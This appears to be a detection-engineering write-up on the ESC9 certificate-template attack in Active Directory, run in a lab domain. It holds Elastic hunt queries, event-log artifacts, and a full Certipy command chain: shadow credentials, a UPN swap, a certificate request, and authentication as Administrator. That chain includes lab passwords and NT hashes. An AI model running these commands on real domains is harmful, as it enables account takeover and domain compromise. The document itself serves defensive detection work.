# ESC9
# Sources

[https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

[https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
# Hunts

### Loading a vulnerable template (CT_FLAG_NO_SECURITY_EXTENSION)
```sql
winlog.event_id:4898 AND 
winlog.event_data.TemplateContent:*CT_FLAG_NO_SECURITY_EXTENSION* AND 
(winlog.event_data.TemplateContent:
            (
         *1.3.6.1.5.5.7.3.2* OR 
         *1.3.6.1.5.2.3.4* OR 
         *1.3.6.1.4.1.311.20.2.2* OR 
         *2.5.29.37.0*
      ) OR 
      (NOT winlog.event_data.TemplateContent:/.+pKIExtendedKeyUsage =. [0-9]\.[0-9]\.[0-9].+/)
)
```
```
winlog.event_id:4899 AND winlog.event_data.NewTemplateContent:*CT_FLAG_NO_SECURITY_EXTENSION*
```

### Changing certificate mapping settings
```sql
winlog.event_id:4657 AND winlog.event_data.ObjectName:*Services\\Kdc* AND winlog.event_data.ObjectValueName:"StrongCertificateBindingEnforcement"
```
```sql
winlog.event_id:4657 AND winlog.event_data.ObjectName:*SecurityProviders\\SCHANNEL* AND winlog.event_data.ObjectValueName:"CertificateMappingMethods"
```

### Adding the CT_FLAG_NO_SECURITY_EXTENSION flag to a certificate template
Parsing script `get_pki_enrollment_flags.rb`
```sql
winlog.event_id:5136 AND 
winlog.event_data.AttributeLDAPDisplayName:"msPKI-Enrollment-Flag" AND 
winlog.event_data.AttributeValue_list:*CT_FLAG_NO_SECURITY_EXTENSION*
```

### UPN without domain
```sql
(winlog.event_id:5136 AND winlog.event_data.AttributeLDAPDisplayName:"userPrincipalName" AND NOT winlog.event_data.AttributeValue:*@*) OR 
(winlog.event_id:4738 AND NOT winlog.event_data.UserPrincipalName:*@*)
```

### Global extension disabling
```sql
winlog.event_id:4657 AND winlog.event_data.ObjectName:*Services\\CertSvc\\Configuration\* AND winlog.event_data.ObjectValueName:"DisableExtensionList"
```

### System Event 39
```sql
winlog.channel:"System" AND winlog.provider_name:"Microsoft-Windows-Kerberos-Key-Distribution-Center" AND winlog.event_id:39
```


# Commands

Version with explanations
```bash
source certipy-venv/bin/activate

## missandei@essos.local has Generic Write on viserys.targaryen. Shadow cred to get NT hash of viserys.targaryen 
certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12

## Change UPN of viserys.targaryen to Administrator. Works because there is no Administrator UPN, just Administrator@test.local
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn administrator -dc-ip 192.168.56.12

## Certificate request
certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'ESC9'

## Change back
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn 'viserys.targaryen@essos.local' -dc-ip 192.168.56.12

## Auth as Administrator
certipy auth -pfx 'administrator.pfx' -domain "essos.local" -dc-ip 192.168.56.12

```

Short version, ready for full copy-paste
```bash
source certipy-venv/bin/activate

certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn administrator -dc-ip 192.168.56.12
certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'ESC9'
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn 'viserys.targaryen@essos.local' -dc-ip 192.168.56.12
certipy auth -pfx 'administrator.pfx' -domain "essos.local" -dc-ip 192.168.56.12

```

Commands for DC

```bash
## Compatibility mode
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -PropertyType Dword -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -Value 1

## Full Enforcement mode
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -PropertyType Dword -Value 2
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -Value 2
```

### 1. Shadow Credentials

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'viserys.targaryen'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b83a2595dce14fe58474422245fbe449'
[*] Adding Key Credential with device ID 'b83a2595dce14fe58474422245fbe449' to the Key Credentials for 'viserys.targaryen'
[*] Successfully added Key Credential with device ID 'b83a2595dce14fe58474422245fbe449' to the Key Credentials for 'viserys.targaryen'
[*] Authenticating as 'viserys.targaryen' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'viserys.targaryen@essos.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'viserys.targaryen.ccache'
[*] Wrote credential cache to 'viserys.targaryen.ccache'
[*] Trying to retrieve NT hash for 'viserys.targaryen'
[*] Restoring the old Key Credentials for 'viserys.targaryen'
[*] Successfully restored the old Key Credentials for 'viserys.targaryen'
[*] NT hash for 'viserys.targaryen': d96a55df6bef5e0b4d6d956088036097

```

### 2. Change  UPN to Administrator

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn administrator -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'viserys.targaryen':
    userPrincipalName                   : administrator
[*] Successfully updated 'viserys.targaryen'

```

### 3. Request certificate

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'ESC9'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '192.168.56.12'
[+] DC IP: '192.168.56.12'
[+] DC Host: 'ESSOS.LOCAL'
[+] Target IP: None
[+] Remote Name: 'braavos.essos.local'
[+] Domain: 'ESSOS.LOCAL'
[+] Username: 'VISERYS.TARGARYEN'
[+] Trying to resolve 'braavos.essos.local' at '192.168.56.12'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:192.168.56.23[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.56.23[\pipe\cert]
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

### 4. Rollback UPN to viserys.targaryen

```bash                                                                                                                        
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy account update -username "missandei@essos.local" -p "fr3edom" -user 'viserys.targaryen@essos.local' -upn viserys.targaryen -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'viserys.targaryen':
    userPrincipalName                   : viserys.targaryen@essos.local
[*] Successfully updated 'viserys.targaryen'
```

### 5. Auth as Administrator using cert on DC03
#### StrongCertificateBindingEnforcement=1
Выполнить на DC:
```powershell
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -PropertyType Dword -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -Value 1
```
```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy auth -pfx 'administrator.pfx' -domain "essos.local" -dc-ip 192.168.56.12

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@essos.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```
#### StrongCertificateBindingEnforcement=2
Выполнить на DC:
```powershell
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -PropertyType Dword -Value 2
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -Value 2
```
```bash
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@essos.local'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] See the wiki for more information
```

# Artifacts

## Common

### 4898 Loading a vulnerable template (CT_FLAG_NO_SECURITY_EXTENSION)
```
Certificate Services loaded a template.

ESC9 v100.4 (Schema V2)
1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.80278587.62986658
CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local

Template Information:
	Template Content:		
flags = 0x2023a (131642)
  CT_FLAG_ADD_EMAIL -- 0x2
  CT_FLAG_PUBLISH_TO_DS -- 0x8
  CT_FLAG_EXPORTABLE_KEY -- 0x10 (16)
  CT_FLAG_AUTO_ENROLLMENT -- 0x20 (32)
  CT_FLAG_ADD_TEMPLATE_NAME -- 0x200 (512)
  CT_FLAG_IS_MODIFIED -- 0x20000 (131072)

msPKI-Private-Key-Flag = 0x1010010 (16842768)
  CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 0x10 (16)
  CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0x0
  TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0x10000 (65536)
  TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0x1000000 (16777216)

msPKI-Certificate-Name-Flag = 0x2000000 (33554432)
  CT_FLAG_SUBJECT_ALT_REQUIRE_UPN -- 0x2000000 (33554432)

msPKI-Enrollment-Flag = 0x80029 (524329)
  CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 0x1
  CT_FLAG_PUBLISH_TO_DS -- 0x8
  CT_FLAG_AUTO_ENROLLMENT -- 0x20 (32)
  CT_FLAG_NO_SECURITY_EXTENSION -- 0x80000 (524288)

msPKI-Template-Schema-Version = 2

revision = 100

msPKI-Template-Minor-Revision = 4

msPKI-RA-Signature = 0

msPKI-Minimal-Key-Size = 2048

pKIDefaultKeySpec = 1

pKIExpirationPeriod = 1 Years

pKIOverlapPeriod = 6 Weeks

cn = ESC9

distinguishedName = ESC9

msPKI-Cert-Template-OID =
  1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.80278587.62986658 ESC9

pKIKeyUsage = a0

displayName = ESC9

templateDescription = User

pKIExtendedKeyUsage =
  1.3.6.1.5.5.7.3.2 Client Authentication
  1.3.6.1.5.5.7.3.4 Secure Email
  1.3.6.1.4.1.311.10.3.4 Encrypting File System

pKIDefaultCSPs =
  Microsoft Enhanced Cryptographic Provider v1.0

msPKI-Supersede-Templates =

msPKI-RA-Policies =

msPKI-RA-Application-Policies =

msPKI-Certificate-Policy =

msPKI-Certificate-Application-Policy =
  1.3.6.1.5.5.7.3.2 Client Authentication
  1.3.6.1.5.5.7.3.4 Secure Email
  1.3.6.1.4.1.311.10.3.4 Encrypting File System

pKICriticalExtensions =
  2.5.29.7 Subject Alternative Name
  2.5.29.15 Key Usage

	Security Descriptor:		O:S-1-5-21-666199682-1411342147-2938717855-519G:S-1-5-21-666199682-1411342147-2938717855-519D:AI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(A;;LCRPLORC;;;DU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-666199682-1411342147-2938717855-519)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;DA)

Allow	ESSOS\Domain Users
	Enroll
Allow(0x00020094)	ESSOS\Domain Users
	Read
Allow(0x000f01ff)	ESSOS\Domain Admins
	Full Control
Allow(0x00020094)	NT AUTHORITY\Authenticated Users
	Read
Allow(0x000f01ff)	NT AUTHORITY\SYSTEM
	Full Control
Allow(0x000f01ff)	ESSOS\Enterprise Admins
	Full Control
Allow(0x000f01bd)	ESSOS\Domain Admins
	Full Control


Additional Information:
	Domain Controller:	meereen.essos.local
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4898</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T18:50:30.1848651Z" /> 
  <EventRecordID>44622</EventRecordID> 
  <Correlation ActivityID="{9ff9a0da-0fa5-0001-b7a2-f99fa50fdc01}" /> 
  <Execution ProcessID="756" ThreadID="2624" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="TemplateInternalName">ESC9</Data> 
  <Data Name="TemplateVersion">100.4</Data> 
  <Data Name="TemplateSchemaVersion">2</Data> 
  <Data Name="TemplateOID">1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.80278587.62986658</Data> 
  <Data Name="TemplateDSObjectFQDN">CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local</Data> 
  <Data Name="DCDNSName">meereen.essos.local</Data> 
  <Data Name="TemplateContent">flags = 0x2023a (131642) CT_FLAG_ADD_EMAIL -- 0x2 CT_FLAG_PUBLISH_TO_DS -- 0x8 CT_FLAG_EXPORTABLE_KEY -- 0x10 (16) CT_FLAG_AUTO_ENROLLMENT -- 0x20 (32) CT_FLAG_ADD_TEMPLATE_NAME -- 0x200 (512) CT_FLAG_IS_MODIFIED -- 0x20000 (131072) msPKI-Private-Key-Flag = 0x1010010 (16842768) CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 0x10 (16) CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0x0 TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0x10000 (65536) TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0x1000000 (16777216) msPKI-Certificate-Name-Flag = 0x2000000 (33554432) CT_FLAG_SUBJECT_ALT_REQUIRE_UPN -- 0x2000000 (33554432) msPKI-Enrollment-Flag = 0x80029 (524329) CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 0x1 CT_FLAG_PUBLISH_TO_DS -- 0x8 CT_FLAG_AUTO_ENROLLMENT -- 0x20 (32) CT_FLAG_NO_SECURITY_EXTENSION -- 0x80000 (524288) msPKI-Template-Schema-Version = 2 revision = 100 msPKI-Template-Minor-Revision = 4 msPKI-RA-Signature = 0 msPKI-Minimal-Key-Size = 2048 pKIDefaultKeySpec = 1 pKIExpirationPeriod = 1 Years pKIOverlapPeriod = 6 Weeks cn = ESC9 distinguishedName = ESC9 msPKI-Cert-Template-OID = 1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.80278587.62986658 ESC9 pKIKeyUsage = a0 displayName = ESC9 templateDescription = User pKIExtendedKeyUsage = 1.3.6.1.5.5.7.3.2 Client Authentication 1.3.6.1.5.5.7.3.4 Secure Email 1.3.6.1.4.1.311.10.3.4 Encrypting File System pKIDefaultCSPs = Microsoft Enhanced Cryptographic Provider v1.0 msPKI-Supersede-Templates = msPKI-RA-Policies = msPKI-RA-Application-Policies = msPKI-Certificate-Policy = msPKI-Certificate-Application-Policy = 1.3.6.1.5.5.7.3.2 Client Authentication 1.3.6.1.5.5.7.3.4 Secure Email 1.3.6.1.4.1.311.10.3.4 Encrypting File System pKICriticalExtensions = 2.5.29.7 Subject Alternative Name 2.5.29.15 Key Usage</Data> 
  <Data Name="SecurityDescriptor">O:S-1-5-21-666199682-1411342147-2938717855-519G:S-1-5-21-666199682-1411342147-2938717855-519D:AI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(A;;LCRPLORC;;;DU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-666199682-1411342147-2938717855-519)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;DA) Allow ESSOS\Domain Users Enroll Allow(0x00020094) ESSOS\Domain Users Read Allow(0x000f01ff) ESSOS\Domain Admins Full Control Allow(0x00020094) NT AUTHORITY\Authenticated Users Read Allow(0x000f01ff) NT AUTHORITY\SYSTEM Full Control Allow(0x000f01ff) ESSOS\Enterprise Admins Full Control Allow(0x000f01bd) ESSOS\Domain Admins Full Control</Data> 
  </EventData>
  </Event>
```

## StrongCertificateBindingEnforcement=1

### 4657 Change registry StrongCertificateBindingEnforcement
```
A registry value was modified.

Subject:
	Security ID:		ESSOS\daenerys.targaryen
	Account Name:		daenerys.targaryen
	Account Domain:		ESSOS
	Logon ID:		0x89DA2

Object:
	Object Name:		\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Kdc
	Object Value Name:	StrongCertificateBindingEnforcement
	Handle ID:		0xb70
	Operation Type:		Existing registry value modified

Process Information:
	Process ID:		0x60c
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Change Information:
	Old Value Type:		REG_DWORD
	Old Value:		2
	New Value Type:		REG_DWORD
	New Value:		1
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4657</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>12801</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T18:33:29.770171500Z" /> 
  <EventRecordID>144601</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="4" ThreadID="2636" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1113</Data> 
  <Data Name="SubjectUserName">daenerys.targaryen</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x89da2</Data> 
  <Data Name="ObjectName">\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Kdc</Data> 
  <Data Name="ObjectValueName">StrongCertificateBindingEnforcement</Data> 
  <Data Name="HandleId">0xb70</Data> 
  <Data Name="OperationType">%%1905</Data> 
  <Data Name="OldValueType">%%1876</Data> 
  <Data Name="OldValue">2</Data> 
  <Data Name="NewValueType">%%1876</Data> 
  <Data Name="NewValue">1</Data> 
  <Data Name="ProcessId">0x60c</Data> 
  <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
  </EventData>
  </Event>
```

### System event 39 Warning
```
The Key Distribution Center (KDC) encountered a user certificate that was valid but could not be mapped to a user in a secure way (such as via explicit mapping, key trust mapping, or a SID). Such certificates should either be replaced or mapped directly to the user via explicit mapping. See https://go.microsoft.com/fwlink/?linkid=2189925 to learn more.

  User: Administrator
  Certificate Subject: 
  Certificate Issuer: ESSOS-CA
  Certificate Serial Number: 2000000055B6D772BA7B06D5EA000000000055
  Certificate Thumbprint: 4F8BC10A30778DD3FDEECB7ECEBAF2BE66F1B2D9

```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Kerberos-Key-Distribution-Center" Guid="{3FD9DA1A-5A54-46C5-9A26-9BD7C0685056}" EventSourceName="KDC" /> 
  <EventID Qualifiers="32768">39</EventID> 
  <Version>0</Version> 
  <Level>3</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T18:35:38.450759800Z" /> 
  <EventRecordID>7146</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="0" ThreadID="0" /> 
  <Channel>System</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="AccountName">Administrator</Data> 
  <Data Name="Subject" /> 
  <Data Name="Issuer">ESSOS-CA</Data> 
  <Data Name="SerialNumber">2000000055B6D772BA7B06D5EA000000000055</Data> 
  <Data Name="Thumbprint">4F8BC10A30778DD3FDEECB7ECEBAF2BE66F1B2D9</Data> 
  <Binary /> 
  </EventData>
  </Event>
```

### 4886 Certificate request
```
Certificate Services received a certificate request.
	
Request ID:	85
Requester:	ESSOS\viserys.targaryen
Attributes:	CertificateTemplate:ESC9
Subject from CSR:	CN=Viserys.targaryen
Subject Alternative Name from CSR:

Requested Template:	ESC9
RequestOSVersion:	
RequestCSPProvider:	
RequestClientInfo:	
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		RPC
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4886</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T18:35:35.8480975Z" /> 
  <EventRecordID>42883</EventRecordID> 
  <Correlation ActivityID="{9ff9a0da-0fa5-0001-b7a2-f99fa50fdc01}" /> 
  <Execution ProcessID="756" ThreadID="2628" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">85</Data> 
  <Data Name="Requester">ESSOS\viserys.targaryen</Data> 
  <Data Name="Attributes">CertificateTemplate:ESC9</Data> 
  <Data Name="Subject">CN=Viserys.targaryen</Data> 
  <Data Name="SubjectAlternativeName" /> 
  <Data Name="CertificateTemplate">ESC9</Data> 
  <Data Name="RequestOSVersion" /> 
  <Data Name="RequestCSPProvider" /> 
  <Data Name="RequestClientInfo" /> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>
```


### 4887 Issued Certificate

```
Certificate Services approved a certificate request and issued a certificate.
	
Request ID:	85
Requester:	ESSOS\viserys.targaryen
Attributes:	CertificateTemplate:ESC9
Disposition:	3
SKI:		06 2f 87 bd ed fb 34 56 dd 00 b4 7d 8e b7 57 f0 59 d2 9d e6
Subject:	
Subject Alternative Name:
Other Name:
     Principal Name=administrator

Certificate Template:	ESC9
Serial Number:		2000000055b6d772ba7b06d5ea000000000055
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		RPC
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4887</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T18:35:36.0645893Z" /> 
  <EventRecordID>42887</EventRecordID> 
  <Correlation ActivityID="{9ff9a0da-0fa5-0001-b7a2-f99fa50fdc01}" /> 
  <Execution ProcessID="756" ThreadID="2628" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">85</Data> 
  <Data Name="Requester">ESSOS\viserys.targaryen</Data> 
  <Data Name="Attributes">CertificateTemplate:ESC9</Data> 
  <Data Name="Disposition">3</Data> 
  <Data Name="SubjectKeyIdentifier">06 2f 87 bd ed fb 34 56 dd 00 b4 7d 8e b7 57 f0 59 d2 9d e6</Data> 
  <Data Name="Subject" /> 
  <Data Name="SubjectAlternativeName">Other Name: Principal Name=administrator</Data> 
  <Data Name="CertificateTemplate">ESC9</Data> 
  <Data Name="SerialNumber">2000000055b6d772ba7b06d5ea000000000055</Data> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>
```

### 4768 TGT Request
```
A Kerberos authentication ticket (TGT) was requested.

Account Information:
	Account Name:		Administrator
	Supplied Realm Name:	ESSOS.LOCAL
	User ID:			ESSOS\Administrator
	MSDS-SupportedEncryptionTypes:	0x27 (DES, RC4, AES-Sk)
	Available Keys:	RC4

Service Information:
	Service Name:		krbtgt
	Service ID:		ESSOS\krbtgt
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Domain Controller Information:
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Network Information:
	Client Address:		::ffff:192.168.56.101
	Client Port:		63635
	Advertized Etypes:	
		AES256-CTS-HMAC-SHA1-96
		AES128-CTS-HMAC-SHA1-96

Additional Information:
	Ticket Options:		0x40800010
	Result Code:		0x0
	Ticket Encryption Type:	0x12
	Session Encryption Type:	0x12
	Pre-Authentication Type:	16
	Pre-Authentication EncryptionType:	0x0

Certificate Information:
	Certificate Issuer Name:		ESSOS-CA
	Certificate Serial Number:	2000000055B6D772BA7B06D5EA000000000055
	Certificate Thumbprint:		4F8BC10A30778DD3FDEECB7ECEBAF2BE66F1B2D9

Ticket information
	Response ticket hash:		n/a
Certificate information is only provided if a certificate was used for pre-authentication.

Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
``` 

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4768</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>14339</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T18:35:38.460547700Z" /> 
  <EventRecordID>144929</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="684" ThreadID="2028" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="TargetUserName">Administrator</Data> 
  <Data Name="TargetDomainName">ESSOS.LOCAL</Data> 
  <Data Name="TargetSid">S-1-5-21-666199682-1411342147-2938717855-500</Data> 
  <Data Name="ServiceName">krbtgt</Data> 
  <Data Name="ServiceSid">S-1-5-21-666199682-1411342147-2938717855-502</Data> 
  <Data Name="TicketOptions">0x40800010</Data> 
  <Data Name="Status">0x0</Data> 
  <Data Name="TicketEncryptionType">0x12</Data> 
  <Data Name="PreAuthType">16</Data> 
  <Data Name="IpAddress">::ffff:192.168.56.101</Data> 
  <Data Name="IpPort">63635</Data> 
  <Data Name="CertIssuerName">ESSOS-CA</Data> 
  <Data Name="CertSerialNumber">2000000055B6D772BA7B06D5EA000000000055</Data> 
  <Data Name="CertThumbprint">4F8BC10A30778DD3FDEECB7ECEBAF2BE66F1B2D9</Data> 
  <Data Name="ResponseTicket">n/a</Data> 
  <Data Name="AccountSupportedEncryptionTypes">0x27 (DES, RC4, AES-Sk)</Data> 
  <Data Name="AccountAvailableKeys">RC4</Data> 
  <Data Name="ServiceSupportedEncryptionTypes">0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)</Data> 
  <Data Name="ServiceAvailableKeys">AES-SHA1, RC4</Data> 
  <Data Name="DCSupportedEncryptionTypes">0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)</Data> 
  <Data Name="DCAvailableKeys">AES-SHA1, RC4</Data> 
